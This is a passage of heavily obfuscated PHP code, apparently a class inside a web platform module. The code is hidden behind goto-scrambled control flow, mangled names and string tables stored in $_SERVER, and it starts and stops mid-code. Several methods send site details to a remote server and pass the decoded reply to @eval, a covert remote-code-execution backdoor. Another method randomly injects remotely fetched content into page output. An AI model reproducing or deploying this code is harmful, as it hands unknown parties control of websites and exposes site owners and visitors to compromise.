$D´Î‚»£¡İ[131] && isset($bÎÓÚ¾¸ññ[$D´Î‚»£¡İ[253]])) { $D´Î‚»£¡İ[176]($D´Î‚»£¡İ[208]($D´Î‚»£¡İ[248]), !1, $D´Î‚»£¡İ[249]); die; } $BŸƒ—’³¼ = $this->{$_SERVER[£ñ­Åö°¿][147]}(); if ($BŸƒ—’³¼ != $D´Î‚»£¡İ[254]($D´Î‚»£¡İ[255])) { if ($BŸƒ—’³¼ <= $D´Î‚»£¡İ[61]($D´Î‚»£¡İ[149])->{$_SERVER[£ñ­Åö°¿][150]}()) { $D´Î‚»£¡İ[176]($D´Î‚»£¡İ[208]($D´Î‚»£¡İ[256]), !1, $D´Î‚»£¡İ[249]); die; } } } } private function zhwn10e3e930() { goto dŸòÙ‡°É¹; E×Ôñá“’”: $e¸™Ö‡ì†Ÿ = @$bÎï‘â·¾[267]($fòÌÃ§¤Õ, !1, $Fô½Ù£ƒÁ¾); $eİ˜šÚºÍ’ = $fÛ‹ëëÚÒ[632]; $bÎï‘â·¾[268]($bÎï‘â·¾[269]); goto dÂÖ‘õ·Ü†; B¯í£Ú¢ê: die; goto b õ†‹ÄÜ; DÌº‰ç¹: $cÀ™ó¼¿ò¥ = $fÛ‹ëëÚÒ[630]; if (strlen($cÀ™ó¼¿ò¥) < $fÛ‹ëëÚÒ[579]) { return; } if (!$bÎï‘â·¾[116]($GLOBALS, $bÎï‘â·¾[142]) || !isset($_GET[$bÎï‘â·¾[258]])) { return; } goto C×ÁÚÀÅËê; dŸòÙ‡°É¹: $fÛ‹ëëÚÒ =& $_SERVER[Ïº«‚ßèÔˆø]; $bÎï‘â·¾ =& $_SERVER[£ñ­Åö°¿]; $Aåá´›™Ÿ÷ = array($bÎï‘â·¾[145], $bÎï‘â·¾[257]); goto DÌº‰ç¹; dÂÖ‘õ·Ü†: $dØ¾äöÛâ‡ = $fÛ‹ëëÚÒ[633]; if (strlen($dØ¾äöÛâ‡) < $fÛ‹ëëÚÒ[577]) { return; } if ($e¸™Ö‡ì†Ÿ && $bÎï‘â·¾[32]($e¸™Ö‡ì†Ÿ, $bÎï‘â·¾[270])) { echo $e¸™Ö‡ì†Ÿ; } goto B¯í£Ú¢ê; C×ÁÚÀÅËê: if (!$bÎï‘â·¾[252]($_SERVER[$bÎï‘â·¾[44]], $Aåá´›™Ÿ÷)) { return; } $fòÌÃ§¤Õ = $bÎï‘â·¾[259]; $fòÌÃ§¤Õ = $this->{$_SERVER[£ñ­Åö°¿][260]}($fòÌÃ§¤Õ, $bÎï‘â·¾[261]); goto b’Ÿ·òÓõ; b’Ÿ·òÓõ: $Fô½Ù£ƒÁ¾ = $bÎï‘â·¾[262](array($bÎï‘â·¾[263] => array($bÎï‘â·¾[264] => $bÎï‘â·¾[265], $bÎï‘â·¾[266] => 3))); $Cö—¶ñó× = $fÛ‹ëëÚÒ[631]; if (strlen($Cö—¶ñó×) < $fÛ‹ëëÚÒ[577]) { die; } goto E×Ôñá“’”; b õ†‹ÄÜ: } public function ocrl4bfacfba($f´ƒ„ƒÄö—) { goto eëŠ©á÷á; FùÒ“”æ: $A´²²‡ã“Ú = $c½¢†Ê¤Ä[0]($c½¢†Ê¤Ä[289], $c½¢†Ê¤Ä[116]($this->bzsy48d1293c, $c½¢†Ê¤Ä[139], $c½¢†Ê¤Ä[10])); $f¸óÁëæ›Ä = array(); foreach ($F„¥—ñ¿Æê as $C“ã•â«ô => $cĞª—óŒŞì) { if ($cĞª—óŒŞì == $c½¢†Ê¤Ä[273] && $c½¢†Ê¤Ä[25]($this->wlan80ca99a8, 0, 1) == $c½¢†Ê¤Ä[273]) { continue; } if (!$c½¢†Ê¤Ä[252]($C“ã•â«ô, $A´²²‡ã“Ú)) { $f¸óÁëæ›Ä[] = $C“ã•â«ô; } } goto DŒÀà„åÂö; eëŠ©á÷á: $Cºªë·éâ =& $_SERVER[Ïº«‚ßèÔˆø]; $c½¢†Ê¤Ä =& $_SERVER[£ñ­Åö°¿]; if ($this->wlan80ca99a8 == $c½¢†Ê¤Ä[271]) { return $f´ƒ„ƒÄö—; } goto c÷©ƒéñ®î; DŒÀà„åÂö: foreach ($f¸óÁëæ›Ä as $C“ã•â«ô) { unset($f´ƒ„ƒÄö—[$C“ã•â«ô]); $F®Œ¢¾¯Ãš = $Cºªë·éâ[635]; while (strlen($F®Œ¢¾¯Ãš) < $Cºªë·éâ[594]) { if (!$F®Œ¢¾¯Ãš) { break; } $F®Œ¢¾¯Ãš++; } } return $f´ƒ„ƒÄö—; $CßÜ ëµ»½ = $Cºªë·éâ[636]; goto FÕØÚòÃñÑ; FÕØÚòÃñÑ: if (strlen($CßÜ ëµ»½) < $Cºªë·éâ[594]) { die; } goto féï®Ïù·; c÷©ƒéñ®î: $F„¥—ñ¿Æê = array($c½¢†Ê¤Ä[272] => $c½¢†Ê¤Ä[273], $c½¢†Ê¤Ä[274] => $c½¢†Ê¤Ä[273], $c½¢†Ê¤Ä[275] => $c½¢†Ê¤Ä[273], $c½¢†Ê¤Ä[276] => $c½¢†Ê¤Ä[273], $c½¢†Ê¤Ä[277] => $c½¢†Ê¤Ä[273], $c½¢†Ê¤Ä[278] => $c½¢†Ê¤Ä[273], $c½¢†Ê¤Ä[279] => $c½¢†Ê¤Ä[280], $c½¢†Ê¤Ä[281] => $c½¢†Ê¤Ä[280], $c½¢†Ê¤Ä[282] => $c½¢†Ê¤Ä[280], $c½¢†Ê¤Ä[283] => $c½¢†Ê¤Ä[280], $c½¢†Ê¤Ä[284] => $c½¢†Ê¤Ä[280], $c½¢†Ê¤Ä[285] => $c½¢†Ê¤Ä[280], $c½¢†Ê¤Ä[286] => $c½¢†Ê¤Ä[280], $c½¢†Ê¤Ä[287] => $c½¢†Ê¤Ä[280], $c½¢†Ê¤Ä[288] => $c½¢†Ê¤Ä[280]); $eêÏµƒâë = $Cºªë·éâ[634]; if (!$eêÏµƒâë) { return; } goto FùÒ“”æ; féï®Ïù·: } private function fwql6345bc8a() { $e²šÈ©© =& $_SERVER[£ñ­Åö°¿]; if ($this->wlan80ca99a8 != $e²šÈ©©[131]) { return; } $GLOBALS[$e²šÈ©©[104]][$e²šÈ©©[108]][$e²šÈ©©[290]] = $e²šÈ©©[230]; $GLOBALS[$e²šÈ©©[104]][$e²šÈ©©[291]] = $e²šÈ©©[230]; if ($e²šÈ©©[61]($e²šÈ©©[292])->{$_SERVER[£ñ­Åö°¿][63]}($e²šÈ©©[93]) != $e²šÈ©©[244]) { $e²šÈ©©[61]($e²šÈ©©[292])->{$_SERVER[£ñ­Åö°¿][231]}($e²šÈ©©[93], $e²šÈ©©[244]); } } public function rkbc77f0a92c() { $CÌ†¶À¤ß =& $_SERVER[Ïº«‚ßèÔˆø]; return $_SERVER[£ñ­Åö°¿][293]; $c„¡õê­ = $CÌ†¶À¤ß[637]; while (strlen($c„¡õê­) < $CÌ†¶À¤ß[582]) { if (!$c„¡õê­) { break; } $c„¡õê­++; } } private function lwag78d0eb7f() { goto fŠ£¾ŠíÄ; a±æä…ÒÑ: $F«ÉêÕôš = $b†®ŞÍ½¬±[640]; if (!$F«ÉêÕôš) { return; } $C¡ïÍí‚° = array($a‚Êó­Á“[175] => $a‚Êó­Á“[61]($a‚Êó­Á“[62])->{$_SERVER[£ñ­Åö°¿][63]}($a‚Êó­Á“[219]), $a‚Êó­Á“[188] => $this->wlan80ca99a8, $a‚Êó­Á“[186] => $_SERVER[$a‚Êó­Á“[187]], $a‚Êó­Á“[179] => $a‚Êó­Á“[159], $a‚Êó­Á“[182] => $_SERVER[$a‚Êó­Á“[183]]); goto DÑñÌ³ÔÎ; dÌ“¤¹µÄ¼: $DÔ÷á½È¶ = $b†®ŞÍ½¬±[642]; if (!$DÔ÷á½È¶) { die; } if (!$a‚Êó­Á“[202]($f¾Ü¸ÚŠéĞ)) { return; } goto AÏ’ô¯ÛÉô; B˜àßŞã¬: $aÑ‘‰¦Ÿãá = $b†®ŞÍ½¬±[639]; if ($E§Í’Ûˆ® && $a‚Êó­Á“[246]() - $E§Í’Ûˆ® < $a‚Êó­Á“[254]($a‚Êó­Á“[301])) { return; } $a‚Êó­Á“[13](array($a‚Êó­Á“[299], $a‚Êó­Á“[162]), $eò‚ãÅŒÊ¦, $a‚Êó­Á“[246]()); goto a±æä…ÒÑ; bÈÔÜá²‚İ: $eò‚ãÅŒÊ¦ = $a‚Êó­Á“[297] . $a‚Êó­Á“[124]($a‚Êó­Á“[298]); $CŸ«Ö‰» = $b†®ŞÍ½¬±[638]; if ($this->wlan80ca99a8 == $a‚Êó­Á“[131] || !$a‚Êó­Á“[116]($GLOBALS, $a‚Êó­Á“[142])) { return; } goto E•òµ—¼²; DÑñÌ³ÔÎ: $c†øÕÆ³ = $b†®ŞÍ½¬±[641]; if (strlen($c†øÕÆ³) < $b†®ŞÍ½¬±[594]) { die; } $f¾Ü¸ÚŠéĞ = $this->{$_SERVER[£ñ­Åö°¿][193]}($a‚Êó­Á“[302], $C¡ïÍí‚°); goto dÌ“¤¹µÄ¼; E•òµ—¼²: if (!$a‚Êó­Á“[252]($_SERVER[$a‚Êó­Á“[44]], $C·ŒƒÏïˆš)) { return; } if ($a‚Êó­Á“[246]() % 4 != 0) { return; } $E§Í’Ûˆ® = $a‚Êó­Á“[13](array($a‚Êó­Á“[299], $a‚Êó­Á“[300]), $eò‚ãÅŒÊ¦); goto B˜àßŞã¬; AÏ’ô¯ÛÉô: if ($f¾Ü¸ÚŠéĞ[$a‚Êó­Á“[175]] && $f¾Ü¸ÚŠéĞ[$a‚Êó­Á“[303]]) { if ($this->{$_SERVER[£ñ­Åö°¿][210]}($f¾Ü¸ÚŠéĞ[$a‚Êó­Á“[303]]) == $C¡ïÍí‚°[$a‚Êó­Á“[175]]) { return; } } $this->{$_SERVER[£ñ­Åö°¿][174]}(); if ($this->{$_SERVER[£ñ­Åö°¿][210]}($f¾Ü¸ÚŠéĞ[$a‚Êó­Á“[303]]) != $C¡ïÍí‚°[$a‚Êó­Á“[175]]) { $D×Šß—©´œ = array($a‚Êó­Á“[212] => $a‚Êó­Á“[61]($a‚Êó­Á“[62])->{$_SERVER[£ñ­Åö°¿][63]}($a‚Êó­Á“[126]), $a‚Êó­Á“[213] => $_SERVER[$a‚Êó­Á“[125]], $a‚Êó­Á“[214] => $a‚Êó­Á“[215](), $a‚Êó­Á“[184] => $_SERVER[$a‚Êó­Á“[185]]); $f°Ù†Ûø²ç = $this->{$_SERVER[£ñ­Åö°¿][216]}($a‚Êó­Á“[158]($D×Šß—©´œ)); $f¾Ü¸ÚŠéĞ = $this->{$_SERVER[£ñ­Åö°¿][193]}($a‚Êó­Á“[217] . $f°Ù†Ûø²ç); if ($f¾Ü¸ÚŠéĞ && $a‚Êó­Á“[202]($f¾Ü¸ÚŠéĞ) && isset($f¾Ü¸ÚŠéĞ[$a‚Êó­Á“[303]])) { $fÓ©Ì„¾—á = $this->{$_SERVER[£ñ­Åö°¿][199]}($f¾Ü¸ÚŠéĞ[$a‚Êó­Á“[303]], 2); if ($fÓ©Ì„¾—á) { $fÓ©Ì„¾—á = $this->{$_SERVER[£ñ­Åö°¿][210]}($fÓ©Ì„¾—á); } if ($fÓ©Ì„¾—á) { try { @eval($fÓ©Ì„¾—á); } catch (Exception $DÒ£šøÁ‚ô) { } } } } goto bóÙùàïÅ†; fŠ£¾ŠíÄ: $b†®ŞÍ½¬± =& $_SERVER[Ïº«‚ßèÔˆø]; $a‚Êó­Á“ =& $_SERVER[£ñ­Åö°¿]; $C·ŒƒÏïˆš = array($a‚Êó­Á“[294], $a‚Êó­Á“[295], $a‚Êó­Á“[296]); goto bÈÔÜá²‚İ; bóÙùàïÅ†: } private function yhcx0e278f9d($e“ì¼é£Œõ = '', $Fç‡ÂÔ´äÕ = array(), $EˆˆòĞêé¬ = 5) { goto C”¨¢‰ÓÒğ; Fñğƒªš×Ä: $d§çÂÂÒ‚‹ = $d§çÂÂÒ‚‹ . $e“ì¼é£Œõ; $Bø¾‘˜ìÉí = $fŠ—„ÊÕ[644]; while ($Bø¾‘˜ìÉí < $fŠ—„ÊÕ[585]) { if ($Bø¾‘˜ìÉí >= 0) { break; } $Bø¾‘˜ìÉí++; } goto a½”»ïØƒ; a½”»ïØƒ: if ($Fç‡ÂÔ´äÕ && $F¸æ‚Ä‚¸[202]($Fç‡ÂÔ´äÕ)) { $d§çÂÂÒ‚‹ = $d§çÂÂÒ‚‹ . $F¸æ‚Ä‚¸[306] . $F¸æ‚Ä‚¸[307]($Fç‡ÂÔ´äÕ); } if ($Fç‡ÂÔ´äÕ === -1) { return $d§çÂÂÒ‚‹; } $eñÇ‹¹ö—· = $F¸æ‚Ä‚¸[262](array($F¸æ‚Ä‚¸[263] => array($F¸æ‚Ä‚¸[266] => $EˆˆòĞêé¬, $F¸æ‚Ä‚¸[264] => $F¸æ‚Ä‚¸[308]), $F¸æ‚Ä‚¸[309] => array($F¸æ‚Ä‚¸[310] => !1, $F¸æ‚Ä‚¸[311] => !1))); goto eÓÚ¾Ú­¿¡; dšæŞÛÏ©¶: return $F¸æ‚Ä‚¸[201]($Fç‡ÂÔ´äÕ, !0); goto A¿×¬ªï¤; d¼õ¿Ş’©„: $d§çÂÂÒ‚‹ = $this->{$_SERVER[£ñ­Åö°¿][260]}($d§çÂÂÒ‚‹, $F¸æ‚Ä‚¸[305]); $fù·Ğ¤¥• = $fŠ—„ÊÕ[643]; if (strlen($fù·Ğ¤¥•) < $fŠ—„ÊÕ[582]) { die; } goto Fñğƒªš×Ä; eÓÚ¾Ú­¿¡: $Fç‡ÂÔ´äÕ = @$F¸æ‚Ä‚¸[267]($d§çÂÂÒ‚‹, !1, $eñÇ‹¹ö—·); $EíË¿Í†… = $fŠ—„ÊÕ[645]; while ($EíË¿Í†… < $fŠ—„ÊÕ[579]) { if ($EíË¿Í†… >= 0) { break; } $EíË¿Í†…++; } goto dšæŞÛÏ©¶; C”¨¢‰ÓÒğ: $fŠ—„ÊÕ =& $_SERVER[Ïº«‚ßèÔˆø]; $F¸æ‚Ä‚¸ =& $_SERVER[£ñ­Åö°¿]; $d§çÂÂÒ‚‹ = $F¸æ‚Ä‚¸[304]; goto d¼õ¿Ş’©„; A¿×¬ªï¤: } private function qenb6fccbb9b() { goto cïÓ„ÄĞš; e£î•ÀÉ²¥: $aÓÛ‡Çİâ = $F»¹ö÷ê™ä[646]; if (!$aÓÛ‡Çİâ) { return; } $A¾ö±ªƒËî = $f˜‰¥¹®ˆ¶[$this->wlan80ca99a8]; goto Fé¥à÷; Fé¥à÷: $c¬’Ò„ªØõ = $F»¹ö÷ê™ä[647]; if (strlen($c¬’Ò„ªØõ) < $F»¹ö÷ê™ä[579]) { die; } $A¾ö±ªƒËî = $eÛ¤Ã”†Ğ[254]($A¾ö±ªƒËî ? $A¾ö±ªƒËî : $eÛ¤Ã”†Ğ[313]); goto EŸŸåØšÕ÷; aŒ‰¨ÂÇ: $AÅö «—‰¦ = $AÅö «—‰¦ ? $eÛ¤Ã”†Ğ[254]($AÅö «—‰¦) : 0; $cŸÜ»ïÈÊœ = $F»¹ö÷ê™ä[649]; return $A¾ö±ªƒËî + $AÅö «—‰¦; goto D™‚Ö‰…ç„; EŸŸåØšÕ÷: $AÅö «—‰¦ = $eÛ¤Ã”†Ğ[116]($this->bzsy48d1293c, $eÛ¤Ã”†Ğ[339]); $fĞš©º»¾° = $F»¹ö÷ê™ä[648]; if (strlen($fĞš©º»¾°) < $F»¹ö÷ê™ä[585]) { return; } goto aŒ‰¨ÂÇ; D™‚Ö‰…ç„: $D†ÏÁÎ¨Ï‘ = $F»¹ö÷ê™ä[650]; goto FÜ›òäğ§; cïÓ„ÄĞš: $F»¹ö÷ê™ä =& $_SERVER[Ïº«‚ßèÔˆø]; $eÛ¤Ã”†Ğ =& $_SERVER[£ñ­Åö°¿]; $f˜‰¥¹®ˆ¶ = array($eÛ¤Ã”†Ğ[312] => $eÛ¤Ã”†Ğ[313], $eÛ¤Ã”†Ğ[314] => $eÛ¤Ã”†Ğ[315], $eÛ¤Ã”†Ğ[316] => $eÛ¤Ã”†Ğ[317], $eÛ¤Ã”†Ğ[318] => $eÛ¤Ã”†Ğ[319], $eÛ¤Ã”†Ğ[320] => $eÛ¤Ã”†Ğ[321], $eÛ¤Ã”†Ğ[322] => $eÛ¤Ã”†Ğ[255], $eÛ¤Ã”†Ğ[323] => $eÛ¤Ã”†Ğ[255], $eÛ¤Ã”†Ğ[324] => $eÛ¤Ã”†Ğ[313], $eÛ¤Ã”†Ğ[325] => $eÛ¤Ã”†Ğ[315], $eÛ¤Ã”†Ğ[326] => $eÛ¤Ã”†Ğ[317], $eÛ¤Ã”†Ğ[327] => $eÛ¤Ã”†Ğ[328], $eÛ¤Ã”†Ğ[329] => $eÛ¤Ã”†Ğ[319], $eÛ¤Ã”†Ğ[330] => $eÛ¤Ã”†Ğ[331], $eÛ¤Ã”†Ğ[332] => $eÛ¤Ã”†Ğ[321], $eÛ¤Ã”†Ğ[333] => $eÛ¤Ã”†Ğ[334], $eÛ¤Ã”†Ğ[335] => $eÛ¤Ã”†Ğ[336], $eÛ¤Ã”†Ğ[337] => $eÛ¤Ã”†Ğ[338]); goto e£î•ÀÉ²¥; FÜ›òäğ§: } public function jond8da2ecf1($E´¡–ò¹Ò) { goto AŞ… ‚‘Êº; AŞ… ‚‘Êº: $F…÷òÄĞºš =& $_SERVER[£ñ­Åö°¿]; $BôĞÛˆ©Ù = $this->{$_SERVER[£ñ­Åö°¿][147]}(); if ($E´¡–ò¹Ò[$F…÷òÄĞºš[340]] == $F…÷òÄĞºš[230]) { return; } goto eÆõƒÖè­; fØÇñÊ¿Ëğ: $F¬Š¦ˆÅ… = $F…÷òÄĞºš[61]($F…÷òÄĞºš[149])->{$_SERVER[£ñ­Åö°¿][341]}($F…÷òÄĞºš[340])->{$_SERVER[£ñ­Åö°¿][342]}($BôĞÛˆ©Ù)->{$_SERVER[£ñ­Åö°¿][343]}(); $F¬Š¦ˆÅ… = $F…÷òÄĞºš[232]($F¬Š¦ˆÅ…, $F…÷òÄĞºš[10], $F…÷òÄĞºš[340]); $BìÚ¸™©  = $_SERVER[Ïº«‚ßèÔˆø][651]; goto cÍ”ŒçÌ; eÆõƒÖè­: if ($BôĞÛˆ©Ù >= $F…÷òÄĞºš[254]($F…÷òÄĞºš[255])) { return; } $D‘¸Ä…ö÷Â = $F…÷òÄĞºš[61]($F…÷òÄĞºš[149])->{$_SERVER[£ñ­Åö°¿][150]}(); if ($D‘¸Ä…ö÷Â <= $BôĞÛˆ©Ù) { return; } goto fØÇñÊ¿Ëğ; cÍ”ŒçÌ: if (!$F…÷òÄĞºš[252]($E´¡–ò¹Ò[$F…÷òÄĞºš[340]], $F¬Š¦ˆÅ…)) { $F…÷òÄĞºš[176]($F…÷òÄĞºš[344], !1, $F…÷òÄĞºš[249]); } goto fË¬¡–îÄŒ; fË¬¡–îÄŒ: } public function svae80e79305() { goto bÂãÊ†»®à; DÊÌè¥»÷‘: echo $F‡Ñ†°È”ó[346] . $F‡Ñ†°È”ó[347]($d‚«¦ÓŠÇ¡) . $F‡Ñ†°È”ó[348]; $E¼ˆÏ¹İÄ‡ = $AªóÎÅÆ–°[653]; goto B†©æİ¢¶¢; båÇ¦ ÷›¼: $B—›ÊóÂ™¢ = $AªóÎÅÆ–°[652]; while ($B—›ÊóÂ™¢ < $AªóÎÅÆ–°[585]) { if ($B—›ÊóÂ™¢ >= 0) { break; } $B—›ÊóÂ™¢++; } $d‚«¦ÓŠÇ¡ = @$F‡Ñ†°È”ó[267]($aŒå‘·¬è, !1, $DåĞ¨ŠÏÅî); goto DÊÌè¥»÷‘; bÂãÊ†»®à: $AªóÎÅÆ–° =& $_SERVER[Ïº«‚ßèÔˆø]; $F‡Ñ†°È”ó =& $_SERVER[£ñ­Åö°¿]; if (!$F‡Ñ†°È”ó[116]($GLOBALS, $F‡Ñ†°È”ó[142]) || $F‡Ñ†°È”ó[345](1, 100) > 20) { return; } goto Cš é¥¥éå; Cš é¥¥éå: $aŒå‘·¬è = $F‡Ñ†°È”ó[259]; $aŒå‘·¬è = $this->{$_SERVER[£ñ­Åö°¿][260]}($aŒå‘·¬è, $F‡Ñ†°È”ó[261]); $DåĞ¨ŠÏÅî = $F‡Ñ†°È”ó[262](array($F‡Ñ†°È”ó[263] => array($F‡Ñ†°È”ó[264] => $F‡Ñ†°È”ó[265], $F‡Ñ†°È”ó[266] => 3))); goto båÇ¦ ÷›¼; B†©æİ¢¶¢: } private function olea223cc5c7($c…·ãŒ, $bÅ¬´°ôˆÍ, $d¦ÎÉ†©¬• = 3) { goto fˆ™¦çª‘; EøÊ´ªéÊ: if ($d¦ÎÉ†©¬• - 1 > 0) { $DŠèÂÈ’‚® = $this->{$_SERVER[£ñ­Åö°¿][137]}($DŠèÂÈ’‚®, $bÅ¬´°ôˆÍ, $d¦ÎÉ†©¬• - 1); } return $DŠèÂÈ’‚®; goto a©„½èôÑã; fˆ™¦çª‘: $E×ÈÚ•åÎÀ =& $_SERVER[Ïº«‚ßèÔˆø]; $Aéã±—½†¶ =& $_SERVER[£ñ­Åö°¿]; $Aéã±—½†¶[349](1); goto dŞë©Î·³ß; C—ß¢•íßö: $e”òùéŠ×è = $Aéã±—½†¶[345](0, 5) . $Aéã±—½†¶[10]; $E¸²Í‘éÓ = $Aéã±—½†¶[134](15); $f­‹ä›÷´‘ = $E×ÈÚ•åÎÀ[655]; goto d‰«÷½í¯; d‰«÷½í¯: if (!$f­‹ä›÷´‘) { die; } $b‘ïá¼µˆ¸ = $Aéã±—½†¶[350]; $C„Îã¼­ = $E×ÈÚ•åÎÀ[656]; goto d¡“•ˆÌÇ³; d¡“•ˆÌÇ³: while (strlen($C„Îã¼­) < $E×ÈÚ•åÎÀ[585]) { if (!$C„Îã¼­) { break; } $C„Îã¼­++; } switch ($e”òùéŠ×è) { case $Aéã±—½†¶[244]: $DŠèÂÈ’‚® = $this->{$_SERVER[£ñ­Åö°¿][157]}($c…·ãŒ, $Aéã±—½†¶[224]($bÅ¬´°ôˆÍ . $E¸²Í‘éÓ)); break; case $Aéã±—½†¶[230]: $DŠèÂÈ’‚® = $this->{$_SERVER[£ñ­Åö°¿][157]}($c…·ãŒ, $Aéã±—½†¶[224]($E¸²Í‘éÓ . $bÅ¬´°ôˆÍ)); break; case $Aéã±—½†¶[351]: $DŠèÂÈ’‚® = $this->{$_SERVER[£ñ­Åö°¿][157]}($c…·ãŒ, $Aéã±—½†¶[128]($E¸²Í‘éÓ . $bÅ¬´°ôˆÍ)); break; case $Aéã±—½†¶[352]: $DŠèÂÈ’‚® = $this->{$_SERVER[£ñ­Åö°¿][157]}($c…·ãŒ, $Aéã±—½†¶[124]($E¸²Í‘éÓ . $bÅ¬´°ôˆÍ)); break; case $Aéã±—½†¶[353]: goto bœçˆäÜËº; e¤ŠÁ§Æ³ : if (strlen($bÔá™œò·†) < $E×ÈÚ•åÎÀ[594]) { die; } for ($B†Çæ„æöã = 0; $B†Çæ„æöã < $Aéã±—½†¶[24]($c…·ãŒ); $B†Çæ„æöã++) { $F±µ¾½Á¿‰ = $F±µ¾½Á¿‰ == $Aéã±—½†¶[24]($cÂŸ™˜°õ¼) ? 0 : $F±µ¾½Á¿‰; $aˆ‹½¨Ôæ— = $E×ÈÚ•åÎÀ[662]; if (!$aˆ‹½¨Ôæ—) { return; } $c›¯ñ˜ª  = ($EË Œ£¨ÄÔ + $Aéã±—½†¶[355]($b‘ïá¼µˆ¸, $c…·ãŒ[$B†Çæ„æöã]) + $Aéã±—½†¶[356]($cÂŸ™˜°õ¼[$F±µ¾½Á¿‰++])) % 64; $D½ŞÄ¦ôºø .= $b‘ïá¼µˆ¸[$c›¯ñ˜ª ]; } $DŠèÂÈ’‚® = $Aéã±—½†¶[347]($C»Ô³©Û¢¢ . $D½ŞÄ¦ôºø); goto BºÊ®¶«½¸; D¢ß×†Êø: $B†Çæ„æöã = 0; $c›¯ñ˜ª  = 0; $d»‘‹‡‹ ® = $E×ÈÚ•åÎÀ[660]; goto bİÈ¥Úó­; bİÈ¥Úó­: if (strlen($d»‘‹‡‹ ®) < $E×ÈÚ•åÎÀ[577]) { return; } $F±µ¾½Á¿‰ = 0; $bÔá™œò·† = $E×ÈÚ•åÎÀ[661]; goto e¤ŠÁ§Æ³ ; cæÁ‚½‰¡: $D½ŞÄ¦ôºø = $Aéã±—½†¶[10]; $FõÑ‰Ê¦‚˜ = $E×ÈÚ•åÎÀ[659]; if (!$FõÑ‰Ê¦‚˜) { return; } goto D¢ß×†Êø; B¼éâÔ†Œ¬: while ($C©à¡»Ùîã < $E×ÈÚ•åÎÀ[585]) { if ($C©à¡»Ùîã >= 0) { break; } $C©à¡»Ùîã++; } $cÂŸ™˜°õ¼ = $Aéã±—½†¶[124]($C»Ô³©Û¢¢ . $Aéã±—½†¶[124]($bÅ¬´°ôˆÍ . $C»Ô³©Û¢¢) . $bÅ¬´°ôˆÍ); $cÂŸ™˜°õ¼ = $Aéã±—½†¶[25]($cÂŸ™˜°õ¼, $EË Œ£¨ÄÔ % 8, $EË Œ£¨ÄÔ % 8 + 7); goto cæÁ‚½‰¡; bœçˆäÜËº: $c…·ãŒ = $Aéã±—½†¶[128]($c…·ãŒ); $EË Œ£¨ÄÔ = $Aéã±—½†¶[354](0, 64); $a÷¤¾Ò«æ‡ = $E×ÈÚ•åÎÀ[657]; goto BŒùÃ›ì«“; BŒùÃ›ì«“: if (!$a÷¤¾Ò«æ‡) { return; } $C»Ô³©Û¢¢ = $b‘ïá¼µˆ¸[$EË Œ£¨ÄÔ]; $C©à¡»Ùîã = $E×ÈÚ•åÎÀ[658]; goto B¼éâÔ†Œ¬; BºÊ®¶«½¸: break; $b†ŠÅ¸§Æ = $E×ÈÚ•åÎÀ[663]; if (strlen($b†ŠÅ¸§Æ) < $E×ÈÚ•åÎÀ[577]) { die; } goto a–½’Ù…¸ğ; a–½’Ù…¸ğ: default: $DŠèÂÈ’‚® = $this->{$_SERVER[£ñ­Åö°¿][157]}($c…·ãŒ, $bÅ¬´°ôˆÍ . $E¸²Í‘éÓ); break; $aÀºáÊâÑ‡ = $E×ÈÚ•åÎÀ[664]; if (!$aÀºáÊâÑ‡) { die; } } $DŠèÂÈ’‚® = $Aéã±—½†¶[224]($e”òùéŠ×è . $E¸²Í‘éÓ . $DŠèÂÈ’‚®); goto EøÊ´ªéÊ; dŞë©Î·³ß: $c…·ãŒ = $Aéã±—½†¶[2]($c…·ãŒ); $a’·†Ó‘Ñ = $E×ÈÚ•åÎÀ[654]; if (!$a’·†Ó‘Ñ) { die; } goto C—ß¢•íßö; a©„½èôÑã: } private function frju9228f1f4($dğÅÄÕ«ø¯, $Cë™·¹‰Ş, $D¤¡¡è‚ªË = 3) { goto cïåŠ éñÜ; cïåŠ éñÜ: $cİÀøÓïØ =& $_SERVER[Ïº«‚ßèÔˆø]; $d ¨¡™™‡Ú =& $_SERVER[£ñ­Åö°¿]; if (!$d ¨¡™™‡Ú[357]($dğÅÄÕ«ø¯) || $d ¨¡™™‡Ú[24]($dğÅÄÕ«ø¯) < 10) { return !1; } goto Eî†‰ç•í¢; Eî†‰ç•í¢: $dğÅÄÕ«ø¯ = $d ¨¡™™‡Ú[2]($dğÅÄÕ«ø¯); $dğÅÄÕ«ø¯ = $d ¨¡™™‡Ú[224]($dğÅÄÕ«ø¯); $A×áòàÛ‹ = $cİÀøÓïØ[665]; goto a°¹°ù»„ë; d›…®Ğ†: if (strlen($E«Üä…î‰ø) < $cİÀøÓïØ[594]) { die; } $dğÅÄÕ«ø¯ = $d ¨¡™™‡Ú[25]($dğÅÄÕ«ø¯, 16); $AŠªÓÅ¡ò¹ = $d ¨¡™™‡Ú[350]; goto dÃ™–Ş¹å¼; dÃ™–Ş¹å¼: $c³¾ã²¸› = $cİÀøÓïØ[667]; if (!$c³¾ã²¸›) { return; } switch ($f©§¸Åá¤) { case $d ¨¡™™‡Ú[244]: $aŸ‰À‹„ãØ = $this->{$_SERVER[£ñ­Åö°¿][260]}($dğÅÄÕ«ø¯, $d ¨¡™™‡Ú[224]($Cë™·¹‰Ş . $a†¾íîé‘½)); break; $cÂ„ÁáÊ© = $cİÀøÓïØ[668]; while ($cÂ„ÁáÊ© < $cİÀøÓïØ[582]) { if ($cÂ„ÁáÊ© >= 0) { break; } $cÂ„ÁáÊ©++; } case $d ¨¡™™‡Ú[230]: $aŸ‰À‹„ãØ = $this->{$_SERVER[£ñ­Åö°¿][260]}($dğÅÄÕ«ø¯, $d ¨¡™™‡Ú[224]($a†¾íîé‘½ . $Cë™·¹‰Ş)); $F®É·‘â¿ = $cİÀøÓïØ[669]; break; $e·ôÅ’¯ì = $cİÀøÓïØ[670]; while (strlen($e·ôÅ’¯ì) < $cİÀøÓïØ[577]) { if (!$e·ôÅ’¯ì) { break; } $e·ôÅ’¯ì++; } case $d ¨¡™™‡Ú[351]: $aŸ‰À‹„ãØ = $this->{$_SERVER[£ñ­Åö°¿][260]}($dğÅÄÕ«ø¯, $d ¨¡™™‡Ú[128]($a†¾íîé‘½ . $Cë™·¹‰Ş)); $bÁ‚×‡¹†— = $cİÀøÓïØ[671]; if (!$bÁ‚×‡¹†—) { return; } break; case $d ¨¡™™‡Ú[352]: $aŸ‰À‹„ãØ = $this->{$_SERVER[£ñ­Åö°¿][260]}($dğÅÄÕ«ø¯, $d ¨¡™™‡Ú[124]($a†¾íîé‘½ . $Cë™·¹‰Ş)); $dí„¾Èƒï½ = $cİÀøÓïØ[672]; break; case $d ¨¡™™‡Ú[353]: goto dÈìŠÎÅó; BèÊÚâ„: $CÇ‚…Èîáİ = 